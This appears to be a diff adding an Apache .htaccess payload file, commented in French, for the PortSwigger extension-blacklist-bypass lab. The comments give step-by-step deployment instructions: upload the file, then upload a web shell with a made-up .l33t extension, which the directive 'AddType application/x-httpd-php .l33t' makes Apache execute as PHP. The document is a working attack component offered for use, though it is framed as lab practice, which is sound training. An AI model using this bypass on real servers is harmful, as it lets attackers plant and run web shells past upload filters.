@@ -1,0 +1,17 @@
+# htaccess_bypass — Contournement de blacklist d'extension (Apache)
+# ------------------------------------------------------------------
+# Technique : lab PortSwigger "extension blacklist bypass".
+# Principe  : .htaccess n'est en général pas dans la blacklist. On l'uploade
+#             pour dire à Apache de traiter une extension bidon comme du PHP,
+#             puis on uploade le shell avec cette extension.
+#
+# Déploiement :
+#   1. Renommer ce fichier en ".htaccess" (nom exact, commence par un point).
+#   2. L'uploader dans le même dossier que le futur shell.
+#   3. Uploader le shell avec l'extension .l33t (ex : webshell_read.l33t).
+#   4. Accéder à l'URL du shell → Apache l'exécute comme du PHP.
+#
+# ⚠️  Ne fonctionne que si Apache lit les .htaccess (AllowOverride) et
+#     que les deux fichiers atterrissent dans le même répertoire.
+
+AddType application/x-httpd-php .l33t
